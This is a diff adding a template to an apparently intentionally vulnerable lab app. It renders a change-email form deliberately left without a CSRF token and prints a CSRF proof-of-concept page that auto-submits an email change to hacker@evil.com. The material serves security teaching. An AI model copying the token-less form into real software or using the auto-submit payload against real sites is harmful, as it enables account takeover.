@@ -1,0 +1,32 @@
+{% extends "base.html" %}
+{% block title %} — Change Email{% endblock %}
+
+{% block content %}
+<div class="form-container">
+    <div class="vuln-label">VULN: No CSRF Token</div>
+    <h2>Change Email</h2>
+    <p>Logged in as: <strong>{{ user }}</strong></p>
+
+    {% if message %}
+    <div class="alert alert-success">{{ message }}</div>
+    {% endif %}
+
+    <form method="POST">
+        <div class="form-group">
+            <label>New Email</label>
+            <input type="email" name="email" required>
+        </div>
+        <!-- VULN: không có CSRF token -->
+        <button type="submit" class="btn btn-primary">Update Email</button>
+    </form>
+
+    <div class="code-hint">
+        <div class="code-hint-title">CSRF PoC — lưu thành evil.html, mở khi đang login</div>
+        <pre>&lt;form action="http://localhost:5000/session/change-email"
+      method="POST" id="f"&gt;
+  &lt;input name="email" value="hacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</pre>
+    </div>
+</div>
+{% endblock %}
